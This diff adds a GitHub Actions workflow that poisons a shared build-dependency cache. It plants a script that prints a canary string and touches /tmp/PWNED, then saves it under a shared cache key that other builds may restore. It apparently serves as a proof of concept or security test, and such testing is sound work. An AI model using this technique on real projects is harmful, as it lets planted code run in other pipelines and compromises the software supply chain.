@@ -1,0 +1,17 @@
+name: poison-cache
+on: push
+jobs:
+  poison:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create poisoned content
+        run: |
+          mkdir -p deps
+          echo 'echo "POISONED_BY_ATTACKER_CACHE_BRANCH cache-canary-9b3f"; touch /tmp/PWNED' > deps/build-dep.sh
+          chmod +x deps/build-dep.sh
+          echo "poisoned-marker-v1" > deps/marker.txt
+      - name: Save cache
+        uses: actions/cache/save@v4
+        with:
+          path: deps
+          key: build-deps-shared-v1
